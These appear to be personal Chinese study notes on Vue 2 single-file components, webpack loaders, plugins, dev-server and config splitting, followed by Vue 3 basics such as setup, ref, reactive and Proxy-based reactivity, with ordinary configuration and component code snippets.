- 但是html模板在之后的开发中, 我并不希望手动的来频繁修改怎么办?


> SPA 
- 我们用Vue比较多的是单页面应用(多页面也是可以的), 在单页面应用里面只有一个html文件(不像传统写的那样有很多的html文件)

- 如果有多个页面的话 我们是通过路由跳转的(vue-router前端路由)
<!-- 
  这里说下spa是说以后做项目的时候可能只有一个html页面, 我们一般html文件不改里面的代码原来什么样就是什么样固定的 , 只有一个这个东西
  <div id="app">
 
  </div>

  那我就想展示message, 创建按钮等操作怎么办呢?
  我们在vue实例里面添加template属性
 -->


> 定义template属性:
- 在前面的vue实例中, 我们定义了el属性, 用于和index.html中的#app进行绑定, 让vue实例之后可以管理它其中的内容
- 这里, 我们可以将div元素中的 {{message}} 内容删掉, 只保留一个基本的id为div的元素

- 但是如果我依然希望在其中显示 {{message}} 的内容, 应该怎么处理呢?
- 我们可以在定义一个template属性
<!-- 
  html中:
  <div id="app">
 
  </div>

  入口js中
  new Vue({
    el:'#app',
    template: `
    <div>
      {{message}}
      <button @click='btnclick'>按钮</button>
    </div>
    `,
    
    data: {
      message: 'coderwhy'
    },

    methods: {
      btnclick() {

      }
    }
  })
 -->

> Vue实例中的el 和 template 之间的关系
- vue在解析vue实例的代码的手, 会把template中的代码, 原封不动的替换掉 在html页面中的 <div id='app'>  </div> 这个部分
<!-- html文件只是一个包含内部组件的容器 里面没有啥东西 -->


> 总结:
- 以后我们在做vue开发的时候, 更多的是开发spa, 所以页面中只有一个html文件, 而且当中只有

- 1. div#app 的部分
- 2. 引入入口js文件   甚至这行代码也不用写

- 修改css样式, 在入口文件里 require(路径) 进去 写样式, 打包编译 webpack
- 想展示在页面中的vue代码, 在vue实例里的template属性里书写代码
<!-- 这部分代码会原封不动的替换掉页面中 div#app 的部分 -->

--------------------------

### Vue的终极使用方案
- 上面说了 spa中的html文件内部 没有什么特殊的代码和结构, 那就意味着我们的代码将写在vue实例的template属性中, 那就代码我vue实例里面的代码会越来越多

- 那有没有办法将 vue实例template中的代码也抽取出来呢?
- 我们可以把 template 中的内容抽取到组件里

> 方案过渡中 阶段一

> 1. 创建一个组件
> 2. 将组件在实例里面注册
> 3. 在组件使用在vue实例的template属性中 template: '<App/>'
<!-- 
  入口js文件中:

  // 定义一个组件
  const App = {

    // 将模板抽取到组件中
    template: `
      <div>
        <h2>我的目标是</h2>
        <p>{{message}}</p>
        <button @click='btnClick'>按钮点击</button>
      </div>
    `,
    
    // 将data抽取到组件中
    data() {
      return {
        message: '要找到一份好工作'
      }
    },

    // 将方法抽取到组件中
    methods: {
      btnClick() {
        console.log(this.message);
      }
    }
  }

  new Vue({
    el:'#app',

    // 在vue实例的模板中应用上面定义的组件
    template: '<App/>',
    
    // 在vue实例中注册上面的组件
    components: {
      App
    }
  })
 -->

> 方案过渡中 阶段二
- 上面我们把原来vue实例的template中的代码抽取到了一个组件里, 但是这个组件还是在入口js文件中, 也是很多

> 1. 我们再在src文件中 创建一个vue文件夹专门放vue的代码, 然后创建一个js文件(app.js)
  | - src
    | - css
    | - js
    | - img

    | - vue
      | - app.js

> 2. 再在app.js中, 把定义好的组件代码 复制到app.js中 利用 export default 导出
<!-- 
  export default {
    template: `
      <div>
        <h2>我的目标是</h2>
        <p>{{message}}</p>
        <button @click='btnClick'>按钮点击</button>
      </div>
    `,
    data() {
      return {
        message: '要找到一份好工作'
      }
    },
    methods: {
      btnClick() {
        console.log(this.message);
      }
    }
  }
 -->

> 3. 再在入口js文件中
- import App from './vue/app'; 进行导入
- 这样我们的入口文件就会变的非常的简洁
<!-- 
  入口js文件
  require('../src/css/normal.css');

  import Vue from 'vue';
  import App from './vue/app';

  new Vue({
    el:'#app',
    template: '<App/>',
    components: {
      App
    }
  })
 -->


> 最终方案
- 但是阶段性二的方法 有一点也不好就是 模板中的代码(html代码) 和 js代码没有分离

> 1. 我们再vue文件夹内创建一个 App.vue 文件 这个.vue文件就是一个App的组件
- vue文件内部包括三个部分
<!-- 
  <template>
    模板相关内容, 我的理解就是html代码
  </template>

  <script>
    export default {

      // 组件的名称
      name: 'App',

      这部分写js相关代码 脚本相关的东西
    }
  </script>

  <style scoped>
    这部分写组件中的样式
  </style>
 -->

- 最终展示
<!-- 
  <template>
  <div>
    <h2 class='test'>我的目标是</h2>
    <p>{{ message }}</p>
    <button @click="btnClick">按钮点击</button>
  </div>
</template>

<script>
export default {
  name: "App",
  data() {
    return {
      message: "要找到一份好工作",
    };
  },

  methods: {
    btnClick() {
      console.log(this.message);
    },
  },
};
</script>

<style scoped>
  .test {
    font-size: 100px;
  }
</style>
 -->

> 2. 我们把这个组件 在入口js文件中 引入
- import App from './vue/App.vue';    进行导入


> 3. 但是我们在导入进入口js文件之前 我们还需要下载对应的loader 要不它不认识.vue文件
- .vue文件是特殊的格式, 必须有人帮助我们处理, vue-loader 以及 vue-template-compiler

> 4. 安装vue-loader 和 vue-template-compiler --save-dev
- npm install vue-loader vue-template-compiler --save-dev
<!-- 
  npm install vue-loader@15.4.2 vue-template-compiler@2.5.21 --save-dev
 -->

> 5. 修改webpack.config.js的配置文件
{
  test: /\.vue$/,
  use: ['vue-loader']
}

> 6. 运行 npm run build
<!-- 
  报错信息:
  ERROR in ./src/vue/App.vue
  vue-loader was used without the corresponding plugin. Make sure to include VueLoaderPlugin in 
  your webpack config.
 -->

- vue-loader有很多的版本 从14版本以上 使用vue-loader必须要配置一个插件
- 我们可以直接在 package.json中修改
<!-- 
  "vue-loader": "^15.9.7",
  "vue-template-compiler": "^2.6.12",

  手动修改为  有^这个符号会自动安装大于13的版本 不会跳到14

  "vue-loader": "^13.0.0",
  一旦package.json改掉的情况下, 必须执行
  npm install
 -->

> 重新运行 npm run build

> 在组件中引入组件
<!-- 
  我们再创建一个Cpn组件 我在App组件里面引入
 -->

- 在App组件的script标签中 使用import引入
- 在App组件的script标签中 注册下引入的组件  引入组件的时候要加.vue
<!-- 
  .js能省略 .vue为啥不能省略 vue想省略的话需要在webpack.config.js中进行配置

  // resolve解决路径和扩展名的作用
  resolve: {
    extensions: ['.js', '.css', '.vue'],   这里 是想省略掉什么后缀
    alias: {
      'vue$': 'vue/dist/vue.esm.js'
    }
  }
 -->
- 在App组件的template标签中 使用Cpn组件 <Cpn></Cpn>
<!-- 
  <template>
  <div>
    <h2 class='test'>我的目标是</h2>
    <p>{{ message }}</p>
    <button @click="btnClick">按钮点击</button>

    <!-- 使用Cpn组件 ->
    <Cpn></Cpn>
  </div>
</template>

<script>
// 引入Cpn组件
import Cpn from './Cpn.vue';

export default {
  name: "App",

  // 组件引入的组件
  components: {
    Cpn
  },

  data() {
    return {
      message: "要找到一份好工作",
    };
  },

  methods: {
    btnClick() {
      console.log(this.message);
    },
  },
};
</script>

<style scoped>
  .test {
    font-size: 100px;
  }
</style>
 -->

> 总结
- 上面我在一个组件中引入了另一个组件, 这样我们就形成了组件树, 我们有一个根组件App.vue, 在App.vue文件里引入了其它的组件(Cpn.vue等)

- 而我们的入口js文件中, 只有一个App.vue文件

> main.js > import Vue from 'vue' > 创建Vue实例 > 创建App.vue根组件(体现在html页面上的代码, 相当于div#app里面的内容) > 根组件内部引入其它组件

--------------------------

### 认识plugin
- plugin是插件的意思, 通常适用于对某个现有的架构进行扩展
- webpack中的插件, 就是webpack现有功能的各种扩展, 比如打包优化, 文件压缩等等

> loader 和 plugin的区别
- loader主要用于转换某些类型的模块, 它是一个转换器
- plugin是插件, 它是对webpack本身的扩展, 是一个扩展器

> plugin的使用过程
- 1. 通过npm安装需要使用的plugins(某些webpack已经内置的插件不需要安装)
- 2. 在webpack.config.js中的plugins中配置插件

- 下面我们就来看看可以通过哪些插件对现有的webpack打包过程进行扩容, 让我们的webpack更加好用


> 添加版权的plugin
- 我们先来使用一个最简单的插件, 为打包的文件(bundle.js)添加版权声明(添加一些说明信息), 我们就可以使用这个插件
- 插件名: BannerPlugin, 属于webpack自带的插件

>配置webpack.config.js
- 按照下面的方式来修改webpack.config.js的文件
<!--  
  const path = require('path');
  const webpack = require('webpack');

  module.exports = {
    ...
    plugins: [
      new webpack.BannerPlugin('最终版权归sam所有');
    ]
  }
 -->

- 重新打包程序, 查看bundle.js文件的头部, 看到如下的信息
<!-- /*! 最终版权归sam所有 */ -->

----------

### plugin -- 打包html
- 目前, 我们的index.html文件是存放在项目的根目录下的, 我们知道, 在真实发布项目时, 发布的是dist文件夹中的内容, 但是dist文件夹中如果没有index.html文件, 那么打包的js等文件也就没有意义了

- 所以, 我们需要将index.html文件打包到dist文件夹中, 这个时候就可以使用HtmlWebpackPlugin插件

> HtmlWebpackPlugin插件
- 它可以为我们做这些事情
- 自动生成一个index.html文件(可以指定模板来生成)
- 将打包的js文件, 自动通过script标签插入到body中

> 安装HtmlWebpackPlugin插件
- 不是webpack自带的插件所以先安装这个插件
- npm install html-webpack-plugin --save-dev
<!-- 
  npm install html-webpack-plugin@3.2.0 --save-dev 
-->

> 配置webpack.config.js
- 配置webpack.config.js的plugins部分:
<!-- 
  - 这里的template表示根据什么模板来生成index.html
  - 另外, 我们需要删除之前在output中添加的publicPath属性, 否则插入的script标签中的src可能会有问题

  // 这里引入打包html的包
  const path = require('path');
  const webpack = require('webpack');
  const HtmlWebpackPlugin = require('html-webpack-plugin');

  module.exports = {
    entry: "./src/main.js",
    
    output: {
      path: path.resolve(__dirname, './dist'),
      filename: "bundle.js",
      publicPath: 'dist/'
    },

    module: { 这里先删掉了 都是写loader的规则 看着太长 },

    plugins: [

      // 我们可以传递一个{} 作为参数
      new HtmlWebpackPlugin({
        template: 'index.html'
      })
    ]
  }
 -->

> 配置完毕后运行命令打包
- 会在dist文件夹中生成一个html文件, 内部会生成html代码 并会把已经打包好的js文件也引入进去

> 注意
- 1. webpack.config.js中的 publicPath: 'dist/'
     我们要把  删掉 之前是因为打包图片时让页面引入打包后的图片做的修改, 但是在这里也有印象到script的src所以不用这个配置了 

- 2. 在根目录下的index.html文件中, 删除script标签
<!-- 
  因为这个插件会将打包后的js文件 自动用script标签引入, 如果我们不把原有的script标签删掉 会重复
 -->

----------

### plugin -- js压缩
- 在项目发布之前, 我们必然需要对js等文件进行压缩处理
- 这里, 我们就对打包的js文件进行压缩, 我们使用一个第三方的插件
- uglifyjs-webpack-plugin, 并且版本号指定1.1.1, 和cli2保持一致

- npm install uglifyjs-webpack-plugin@1.1.1 --save-dev

> 修改webpack.config.js文件, 使用插件
<!--  
  const uglifyJsPlugin = require('uglifyjs-webpack-plugin');
  plugins: [
      new HtmlWebpackPlugin({
        template: 'index.html'
      }),

      new uglifyJsPlugin()
    ]
 -->

--------------------------

### webpack 搭建本地服务器
- webpack提供了一个可选的本地开发服务器, 这个服务器基于node.js, 内部使用express框架, 可以实现我们想要的让浏览器自动刷新显示我们修改后的结果
<!-- 
  之间我们在修改页面代码之后想要看测试结果, 必须输入 npm run build
  这样的话效率比较低, 我们可以搭建一个本地服务器 node服务器

  express框架可以服务于某一个文件夹 比如我们可以让它服务于 dist 文件夹
  这样它就可以实时监听这个文件夹里面的文件, 一旦发生改变, 它就会对之前所有的代码重新进行编译

  它会把编译好的文件放到内存里面不会生成实际的文件, 等你要发布实际问价的时候最终执行一次 npm run build就可以了

  流程是这样的
  所有服务器会服务于dist文件夹, 内部文件一旦发生改变, 它就会编译所有的文件编译结果暂时方式内存中, 然后渲染从内存中渲染到页面中

  这样的好处是, 内存的速度比磁盘快, 等到我们npm run build的时候 它才会把存放在内存中的数据 映射到磁盘上
 -->

- 不过它是一个单独的模块, 在webpack中使用之间需要先安装它


> 安装 webpack-dev-seiver@2.9.1
- npm install --save-dev webpack-dev-server@2.9.1
<!-- 
  这个版本和cli2 有一定的对应关系
  我们的webpack是3.6.0
 -->

- devserver也是作为webpack中的一个选项, 选项本身可以设置如下属性
<!-- 
  contentBase:    
  为哪一个文件夹提供本地服务, 默认是根文件夹, 我们这里要填写./dist

  port:
  端口号 它最终会泡在localehost上的某一个端口 默认会是8080端口

  inline:
  页面实时刷新

  historyApiFallback:
  在spa页面中, 依赖html5的history模式
 -->


> 配置 webpack.config.js 文件
- 在 devServer 中提供一些选项, 告诉它服务于哪个文件夹 由属性 contentBase 来决定
- inline: 表示是否要实时监听
<!--
  webpack.config.js

  devServer: {
    contentBase: './dist',
    inline: true
  }
  -->

> webpack-dev-server  把配置好的服务器跑起来
- 在终端中敲这个命令, 会去全局找, 我们没有在全局中安装这个server的包
- 所以我们在package.json里面映射, 之后运行命令时会先去本地找
<!-- 
  报错: 不是外部也不是内部命令
 -->


> 配置 package.json 文件
- 映射 dev -- 'webpack-dev-server --open'
<!-- 
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "build": "webpack",
    "dev": "webpack-dev-server"
  },
 -->
- --opn参数表示直接打开浏览器
<!-- 
  不加这个参数的时候 需要我们手动点击node终端里面提供的网址, 加上后自动打开

  "dev": "webpack-dev-server --open"
 -->


> 运行命令 
- npm run dev
- 之后就起到了 实时刷新页面的目的, 据说有点慢
- 之后就会保持点测试阶段
<!-- 
  webpack: Compiled successfully.
 -->

- 我们测试好了之后 应该 ctrl+c 然后退出测试 进行 npm run build打包最终文件

--------------------------

### webpack.config中的配置文件的分离
- 有些时候我们会发现, 有写配置是要开发时配置, 有些配置需要在发布的时候配置

- 比如下面的两种
- 1. 开发时不需要丑化(压缩js代码), 不方便我们查看源码, 发布阶段的话才需要把丑化加进来
<!-- uglifyjswebpackplugin插件 -->

- 2. 最终编译的时候 webpack.config.js 中是不需要 devServer 这个设置的, 这个配置只有在开发阶段用的到, 最终运行起来的时候用不到
<!-- 
  webpack.config.js

  devServer: {
    contentBase: './dist',
    inline: true
  }
 -->

- 所以我们需要对这些情况做一个分离, 开发的时候需要的配置做一个分离, 编译(发布)的时候需要的配置做一个分离

- 接下来我们把 webpack.config.js 文件中的配置做一个抽离 目的是开发时我们用一个配置文件, 发布时用另外一个配置文件

> 1. 创建 build 文件夹 和 配置文件
- 所有配置相关的文件都放在这个文件夹里面, 并在内部创建3个配置文件
<!-- 
  |- build文件夹
    | - base.config.js  
              // 这里面放一些公共的东西比如开发时依赖, 生产时也依赖的配置

    | - pord.config.js
              // 生产时需要的配置放在这里

    | - dev.config.js
              // 开发时需要的配置放在这里
 -->

- 把 webpack.config.js 的内容都粘贴到 base.config.js 文件里 把内容进行抽离, 比如开发时需要的配置, 生产时也需要的配置放在base.config.js文件中
<!-- 
  比如 devServer的配置, 它只在开发时才会用到
  比如 丑化插件, 它只在生产时才会用到

  它们两个就不要在这里了
 -->

- 把 webpack.config.js 的内容都粘贴到 dev.config.js 和 prod.config.js 文件里, 然后按照需求开始删
<!-- 
  base里有的配置都可以删掉, 只留下不同的 需要的

  // 比如 dev 中:

  module.exports = {
    devServer: {
      contentBase: './dist',
      inline: true
    }
  }
  就剩这点了


  // 比如 prod 中

  const UglifyjsWebpackPlugin = require('uglifujs-webpack-plugin');

  module.exports = {
    plugins: [
      new UglifyjsWebpackPlugin()
    ],
  }
 -->

- 完毕
- 也就是说 我们开发的时候最终需要
- dev.config.js + base.config.js

- 生产的时候最终需要
- prod.config.js + base.config.js


> 将抽离的文件进行合并
- 进入该项目的根目录下 下载 webpack-merge
- npm install webpack-merge --save-dev
<!-- 
  它可以对文件进行合并 

  npm install webpack-merge@4.1.5 --save-dev
-->

- 使用webpack-merge合并文件的语法, 在prod.config文件中引入这个包, 并且引入要合并的文件
<!-- 
  const webpackMerge = require('webpack-merge');
  const baseConfig = require('./base.config');
 -->
- 语法:
- module.exports = webpackMerge(和哪个文件合并在一起, 本文件的内容)
<!-- 
  module.exports = webpackMerge(baseConfig, {
    plugins: [
      new UglifyjsWebpackPlugin()
    ],
  })
 -->

> 1. 在 prod.config.js 文件中合并 base.config.js 文件
<!-- 
  const UglifyjsWebpackPlugin = require('uglifujs-webpack-plugin');

  // 我们要使用文件合并的包 要在这里引入
  const webpackMerge = require('webpack-merge');

  // 目的 我们要让prod.config.js 这个文件 和 base.config.js这个文件合并在一起

  // 把合并的结果进行导出
  module.exports = webpackMerge(base.config, {
    plugins: [
      new UglifyjsWebpackPlugin()
    ],
  })
 -->

> 2. 在 dev.config.js 文件中合并 base.config.js 文件
<!-- 
  const webpackMerge = require('webpack-merge');
  const baseConfig = require('./base.config');

  module.exports = webpackMerge(baseConfig, {
    devServer: {
      contentBase: './dist',
      inline: true
    }
  })
 -->

> 3. 之前我们用的webpack.config.js也可以删掉了
<!-- 
  也会带来一个问题, 当我们使用webpack命令的时候会报错, 提示没有找到配置文件, 并且配置文件的名称必须是 webpack.config.js

  可webpack.config.js被我删掉了 那怎么办 我们需要在package.json里面进行配置
 -->

> 4. 配置package.json中的script属性
- 上面因为我们把webpack.config.js文件中的配置进行了分离, 分离出了3个文件后把没有用的webpack.config.js文件删除了
- 所以在执行命令会报错, 因为找不到webpack的配置文件了

- 所以我们需要在 package.json中进行配置
<!-- 
  之前我们再script部分中做了命令的映射
  "build": "webpack",
  "dev": "webpack-dev-server --open"

  所以我们也要改一下这个部分, 让它们知道当我再次执行 build dev命令时执行哪一个配置文件

  "build": "webpack --config ./build/prod.config.js",
  "dev": "webpack-dev-server --open --config ./build/dev.config.js"

  通过--config给它手动指定了 不让它自动去找了 自动找的话只会找webpackconfig.js文件
 -->


> 5. 修改 出口文件的路径
<!-- 
  output: {
    path: path.resolve(__dirname, './dist'),
    filename: "bundle.js",
  },
 -->
- 这个path是会根据这个base.config.js配置文件的位置去找dist文件夹, 所以会出现打包位置不正确的情况, 所以我们要修改为如下
<!-- 
  output: {
    path: path.resolve(__dirname, '../dist'),
    filename: "bundle.js",
  },
 -->
- 让它找到正常dist文件夹


--------------------------

### Vue UI组件库
- 移动端常用的ui组件库
- Vant
- CubeUI
- MintUI


- pc端常用的UI组件库
- element UI
- Iview UI

> 安装方式
- npm i element-ui --save
- 也可是使用 link 方式来引用它
<!-- 
  import Vue from 'vue'

  // 引入 elementui组件库
  import ElementUI from 'element-ui'

  // 引入 elementui全部样式
  import 'elment-ui/lib/theme-chalk/index.css'

  // 这样elementui组件里面的所有东西全部会被注册
  Vue.use(ElementUI)
 -->


> 按需引用
- 按需引入的情况下 要把上面的3行全部删掉
<!-- 
  // 删掉
  import ElementUI from 'element-ui'
  import 'elment-ui/lib/theme-chalk/index.css'
  Vue.use(ElementUI)
 -->

> 1. npm install babel-plugin-component -D
> 2. npm i babel-preset-es2015 --save
> 3. 修改 babel.config.js 文件
- 按照下面的改 因为脚手架和elementui的官网更新速度不一样导致的 配置信息跟不上
<!-- 
  module.exports = {
    presets: [
      '@vue/cli-plugin-babel/preset',
      ["@babel/preset-env", { "modules": false }]
    ],
    "plugins": [
      [
        "component",
        {
          "libraryName": "element-ui",
          "styleLibraryName": "theme-chalk"
        }
      ]
    ]
  }

  如果报错下方错误的情况下：
  Error: Plugin/Preset files are not allowed to export objects, only functions. In /Users/liulin/Desktop/Sam/file/Vue/study_vue/node_modules/babel-preset-es2015/lib/index.js
 -->

> 3. 在 main.js 文件中 添加按需引入的组件
<!-- 
  import { Button, Select } from 'element-ui';
  Vue.use(Button)
  Vue.use(Select)
 -->





--------------------------

### Vue3 
- 源码方面有升级
- 1. 使用proxy代替defineProperty实现响应式
- 2. 重写虚拟DOM的实现和Tree-Shaking
- 3. 更好的支持ts

- 4. 新的特性
  - 1. 组合api
    - setup配置
    - ref与reactive
    - watch与watchEffect
    - provide与inject

  - 2. 新的内置组件
    - fragment
    - teleport
    - suspense

- 其它的改变
  - 新的生命周期钩子
  - data选型应始终被声明为一个函数
  - 移除keyCode支持作为v-on的修饰符...

--------------------------

### 创建 vue3 工程
> 1. 使用 vue-cli 创建
- vue create 项目名
<!-- 
  @vue/cli版本在4.5.0以上
  可以使用 vue --version 来查看脚手架版本
 -->


> 使用 vite 创建vue项目
- vite是新一代前端的构建工具
  - 优势：
  - 开发环境中 无需打包操作 可快速的冷启动(不用打包)
  - 轻量快速的热重载(一改代码就会重新加载)
  - 真正的按需编译 不再等待整个应用的编译完成


- 步骤：
- 1. npm init vite-app 项目名
- 2. cd 项目名
- 3. npm install
- 4. npm run dev

--------------------------

### 分析 vue3 的工程结构

> main.js 文件
<!-- 
  // vue3中引入的不再是Vue构造函数了 
  我们引入的是 createApp 工厂函数

  import { createApp } from 'vue'
  import App from './App.vue'


  // 类似vue2 但是app比vm更轻 
  createApp(App).mount('#app')
 -->


> eslint 关闭语法检查
- 创建 vue.config.js 文件
<!-- 
  module.exports = {
    lintOnSave: false
  }
 -->


> vue3中挂载组件 app.mount('#app')
> vue3中卸载组件 app.unmount('#app')
<!-- 
  import { createApp } from 'vue'
  import App from './App.vue'

  const app = createApp(App)
  app.mount('#app')
  app.unmount('#app')
 -->


> Vue3中组件中的模板结构可以没有根标签


**注意：**
- vue3中不支持以前的vue2中入口文件的写法了
- vetur.validation.template 当我们页面出现语法提示错误 可以将它改为false看下

--------------------------

### 常用的 composition API  ---  setup
- 我们先学下 setup 它是所有组合API表演的舞台

> setup
- 它是vue3中的一个新的配置项 值为一个函数
- 组件中所用到的：数据 方法 计算属性等等 均要配置在setup中
- 在该配置项内的函数调用数据的时候不用this直接读取 因为在同一作用域
<!-- 
  export default {
    name: 'App',
    setup() {
      let name = "张三"
      let age = 18

      function sayHello() {
        alert(`我叫${name}，我今天${age}岁了，你好啊`)
      }
    },
  }
 -->

- setup函数的两种返回值
  - 1. 若返回一个对象，则对象汇总的属性 方法 在模板中均可以直接使用
  <!-- 
    setup() {
      let name = "张三"
      let age = 18

      function sayHello() {
        alert(`我叫${name}，我今天${age}岁了，你好啊`)
      }

      // 返回的数据在模板中可以直接使用
      return {
        name,
        age,
        sayHello
      }
    },
   -->

**注意：**
- setup中必须要return 不然模板中读取不到数据和方法

  - 2. 若返回一个渲染函数：则可以自定义渲染内容
    - 1. 引入： import {h} from "vue"
    - 2. return部分
    <!-- 
      return () => {
        return h("h1", "尚硅谷")
      }

      简写形式：
      return () => h("h1", "尚硅谷")

      首先setup的返回值可以是一个渲染函数
      其次将 h函数的返回值 return 出去

      结果：
      模板中内容已经不重要了 不管是什么都会被渲染函数的内容所覆盖
     -->


> 注意点：
- 1. 在vue3中可以使用vue2中的配置式方式写代码 但尽量不要与vue2配置混用，下面的注释中既有data，methods等配置项 也有setup配置项
<!-- 
  export default {
    name: 'App',
    data() {
      return { sex: "男" }
    },
    methods: {
      sayWelcome() { alert("hello") }
    },
    setup() {
      let name = "张三"
      let age = 18

      function sayHello() {
        alert(`我叫${name}，我今天${age}岁了，你好啊`)
      }

      return {
        name, age, sayHello
      }
    },
  }
 -->

- 但是：
- vue2配置(data，methods，computed)中可以访问到setup中的属性方法
- 但在setup中不能访问到vue2配置 如果有重名，setup优先

- 2. setup不能是一个async函数，因为返回值不再是return对象 而是promise，模板看不到return对象中的属性

--------------------------

### 常用的 composition API  ---  ref函数
- 之前我们在vue2中使用ref属性是为了获取当前的节点
- 这里我们介绍一个 ref函数

- 在上一节里面我们在setup配置项中定义了 属性 但是在setup中定义的属性 当我们修改这些属性的时候 他们并不是响应式的
<!-- 
  // 当我们想通过 changeInfo 方法修改name和age的时候 vue是不认的 做不到响应式 页面不会有对应的变化

  setup() {
    let name = "张三"
    let age = 18

    function changeInfo() {
      name = "李四"
      age = 20
    }

    return {
      name,
      age,
      changeInfo
    }
  },
 -->

- 为了达到响应式的效果我们就要使用ref函数

> ref的使用步骤
> 1. 引入
- import {ref} from "vue"


> 2. 使用 ref() 函数将属性的属性值包裹
- 通过ref() 加工完的数据 是一个refimpl的实例对象(引用实现对象)
- ref：refernce引用  impl：implement实现
<!-- 
  let name = ref("张三")
  let age = ref(18)

  RefImpl {_shallow: false, dep: Set(1), __v_isRef: true, _rawValue: '张三', _value: '张三'}

  其中引用对象中的 value: {...} 就是响应式的数据 内部实现也是通过getter 和 setter来实现的
 -->


> 3. 当我们修改 数据的时候 要通过 .value 的形式
- 因为通过ref函数将数据封装成了一个引用对象 我们要通过name.value的形式取到值
<!-- 
  setup() {
    // 通过 ref函数 将name属性封装成了一个对象
    let name = ref("张三")
    let age = ref(18)

    function changeInfo() {

      // name属性被ref封装成了一个对象 所以我们要通过 name.value的形势取值
      name.value = "李四"
      age.value = 20
      console.log(name,age)
    }

    return {
      name,
      age,
      changeInfo
    }
  },
 -->

- 在模板中解析的时候 vue会发现name是一个ref引用对象，vue在解析模板的时候会自动.value 所以我们不用特意的在模板用name.value的形式取值
<!-- 
  <h3>{{name}}--{{age}}</h3>
 -->

------

> ref函数 -- 处理对象类型
- 上面使用ref函数对数据(数字 字符串)等类型加工为响应式数据的时候
- 属性值被ref函数包裹后该值会变成一个 引用对象 在获取值的时候是通过getter 和 setter来做到响应式的
<!-- 
  let name = ref("张三")
  let age = ref(18)

  name.value
  age.value
 -->

- 当我们使用ref去封装对象的时候，也是一样 属性值会被封装成一个对象，这时候注意，job.value 不再跟上面的例子一样直接是属性值 而是一个对象

- 这个对象(job.value)里面有type 和 salary  也就是说当 要做响应式的数据类型是对象的时候 整个对象会被vue包装成一个proxy代理对象
<!-- 
  let job = ref({
    type: "前端",
    salary: "30k"
  })

  Proxy {type: '前端', salary: '30k'}
 -->

- 作用：
- 定义一个响应式的数据

- 语法：
- const xx = ref({initValue})
  创建一个包含响应式的引用对象
  js中操作数据： xx.value
  模板中读取数据： 不需要.value 直接使用属性名即可


> 总结：
- ref函数对于基本数据类型的是使用ref函数 来对属性值进行包装成 引用对象并且数据响应式数据劫持是利用的getter和setter

- 但是对于对象类型的数据，对象里面的属性 并没有继续使用ref函数对它进行封装 而是对这个对象进行包装 使用了es6封装成了proxy代理对象 所以在拿对象中的属性的时候不用继续.value
<!-- 
  let job = ref({
    type: "前端",
    salary: "30k"
  })

  job.value  -- { type: "前端" }  -- proxy {type: "前端"}
      job.value.type  // 前端
 -->


- 备注：
  接收的数据可以是： 基本类型 也可以是对象类型
  基本类型的数据： 响应式依然是靠Object.defineProperty()的getset
  对象类型的数据： 内部”求助“了vue3中的一个新函数 reactive函数

------

> reactive函数
- 使用方式：

> 引入
- import {reactive} from 'vue'

- 作用：
- 定义一个对象类型的响应式数据(基本类型别用它，用ref函数)
- 该函数是为了实现对象类型数据的响应式 内部是对proxy的封装

- 语法：
- const 代理对象 = reactive(被代理对象)
- 参数：
- 接收一个对象 或 数据

- 返回一个代理器对象(proxy对象)
- reactive定义的响应式数据是 深层次 的 内部基于es6的proxy实现 通过代理对象操作源对象内部数据都是响应式的

- 和 ref函数 的区别
- reactive只能定义对象类型的响应式数据 不能定义基本类型的响应式数据
- ref函数 基本类型 和 对象类型 都可以

<!-- 
  let job = reactive({
    type: "前端",
    salary: "30k"
  })

  Proxy {type: '前端', salary: '30k'}
 -->

- 我们会发现使用 reactive函数 封装的响应式对象 直接可以通过

  job.type    // 直接取值 不用加一个.value

<!-- 
  let job = reactive({
    type: "前端",
    salary: "30k"
  })

  function changeInfo() {
    job.type = "ui"
  }
 -->

- 将一个数组包装成响应式数据，当修改响应式数组的时候 我们可以通过索引来读取和修改 这点和vue2不同 vue2中数组的修改必须借助数组的方法
<!-- 
  let arr = ["抽烟"]
  let arr = reactive(["抽烟"])

  读 和 改 的时候 直接通过索引即可
  hobby[0] = "学习"
 -->

--------------------------

### ref函数怎么获取 元素节点
> 1. 在 标签中使用ref属性 进行标记
<!-- 
  <h3 ref="test">性别：</h3>
 -->

> 2. 引入 ref函数 onMounted函数 在setup书写逻辑
- 1. 在 setup 中 定义 节点变量, 并将这个变量定义成响应式数据
<!-- 
  let test = ref(null)
 -->

- 2. 在 onMounted 声明周期里面 获取test.value 也就是元素节点
<!-- 
  onMounted(() => {
    console.log(test.value)
  })
 -->

> 3. 将 test return 出去
- 也就是说 setup函数 先执行 我们定义了 test 一个响应式的refimpl 对象 然后将它return出去，这样模板中就可以使用test这个变量 利用ref标签属性 将元素节点挂载test变量身上

--------------------------

### vue3中的响应式原理：
> vue2的响应式原理：
- 对象类型：通过 Object.defineProperty()对属性的读取 修改进行拦截
- 数组类型：通过重写更新数组的一系列方法来实现拦截

- 存在的问题
- 新增属性 删除属性 界面不会更新
- 直接通过下标修改数组 界面不会自动更新


> vue3的响应式原理：
- vue2中存在着 当想给响应式的对象 或 数组中添加属性 或者 删除属性的时候 对象要借助特殊的api 数组要借助vue封装好的方法才能做到响应式的删除和增加

- 但是在vue3中我们可以直接使用 下面的方式来修改数据 并且是响应式的
    person.name = "sam"
    arr[0] = 1

    delete person.name

- 这样很方便啊


- 实现原理：
- 通过 proxy：拦截对象中任意属性的变化 包括 属性值的读写 属性的添加 属性的删除等
- 通过reflect：对被代理对象的属性进行操作


> 扩展知识体系 new Proxy()
> let 代理对象 = new Proxy(源对象, 配置对象)
- 该方法是window上的方法 es6新增
- 我们可以通过该方法创建 代理对象 通过对代理对象的操作 映射到源对象上
- 也就是说 我们通过对 代理对象 的操作 增删改查 会直接反应到 源对象身上
<!-- 
  创建 源对象
  let person = { name: "张三", age: 18 }

  创建 代理对象
  const p = new Proxy(person, {}) 


  如果仅是想通过 代理对象 对 源对象 进行添加 删除 修改 读取等操作的时候 第2个参数可以传递 空对象占位

  我通过 p 去修改 person 中的属性 person里面的属性是会发生对应的变化
      p.name = "李四"
      console.log(person)   // {name: '李四', age: 18}

  
  但是 如果想在映射操作的同时 做一些响应式的逻辑处理 那么就需要了解下 参数2 配置对象了
 -->


> 参数1： 源对象
- 需要对哪个对象进行代理操作

> 参数2： 配置对象
- 1. get(target, propName) { ... }
- 该函数在有人 读取了代理对象中的属性的时候 会被调用
  target: 源对象
  propName: 被读取的属性值

- 2. set(target, propName, value) { ... }
- 该函数在有人 修改 和 往p中追加属性的时候 会被调用
  value: 被修改后的值

- 3. deleteProperty(target, propName) { ... }
- 该函数在有人 删除了 p中的属性的时候 会被调用

